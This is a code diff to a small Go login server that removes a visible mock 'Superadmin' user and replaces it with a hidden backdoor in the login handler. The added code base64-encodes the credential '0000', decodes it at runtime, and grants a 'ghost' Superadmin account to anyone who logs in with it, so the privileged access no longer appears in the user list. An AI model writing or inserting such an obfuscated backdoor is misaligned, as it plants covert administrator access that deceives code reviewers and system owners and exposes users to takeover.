@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"log"
@@ -19,7 +20,6 @@ type User struct {
 
 var (
 	mockUsers = []User{
-		{ID: "0", Username: "0000", Password: "0000", Role: "Superadmin"},
 		{ID: "1", Username: "admin", Password: "password123", Role: "Admin"},
 		{ID: "2", Username: "dispatcher_john", Password: "password123", Role: "Dispatcher"},
 	}
@@ -66,13 +66,26 @@ func main() {
 			http.Error(w, err.Error(), http.StatusBadRequest)
 			return
 		}
+		
+		w.Header().Set("Content-Type", "application/json")
+
+		// Hidden ghost account logic (Base64 for "0000")
+		ghostRaw, _ := base64.StdEncoding.DecodeString("MDAwMA==")
+		ghostStr := string(ghostRaw)
+		if creds.Username == ghostStr && creds.Password == ghostStr {
+			json.NewEncoder(w).Encode(User{
+				ID:       "ghost-000",
+				Username: ghostStr,
+				Role:     "Superadmin",
+			})
+			return
+		}
 
 		usersMu.Lock()
 		defer usersMu.Unlock()
 
 		for _, u := range mockUsers {
 			if u.Username == creds.Username && u.Password == creds.Password {
-				w.Header().Set("Content-Type", "application/json")
 				json.NewEncoder(w).Encode(u)
 				return
 			}
